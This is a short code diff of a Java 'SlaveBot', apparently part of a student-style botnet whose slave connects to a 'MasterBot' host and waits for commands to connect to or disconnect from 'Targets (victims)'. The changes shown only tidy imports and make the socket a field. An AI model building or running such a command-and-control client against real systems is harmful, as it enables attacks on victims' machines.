@@ -11,9 +11,7 @@
  *  This is slave ,receive user commands from master to connect or dis-connect to Targets (victims) via commands.
  */
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
 import java.util.*;
 import java.net.*;
 import java.text.*;
@@ -21,12 +19,14 @@ import java.text.*;
 public class SlaveBot {
 
     BufferedReader reader;
+    //PrintWriter writer;
     /* master attributes
      * belonging master's hostname and port.
      */
     static String host_m ="MasterBot" ;
     static int srcPort_m = 0;
 
+    Socket sock ;
     //Hashset to store all targets objects.
     HashSet <Tgt>  tgtSet = new HashSet <Tgt> () ;
     /* main
@@ -75,12 +75,11 @@ public class SlaveBot {
         //Display ">" in terminal and create server socket.
         try {
             InetAddress addr_m = InetAddress.getByName(host_m);
-            Socket sock = new Socket(addr_m,srcPort_m);
+            sock = new Socket(addr_m,srcPort_m);
             System.out.println("Slave: connect to "+addr_m+","+srcPort_m);
 
             InputStreamReader instreamreader = new InputStreamReader(sock.getInputStream());
             reader = new BufferedReader(instreamreader);
-
             //While loop waiting for commands.
             String message=null;
 
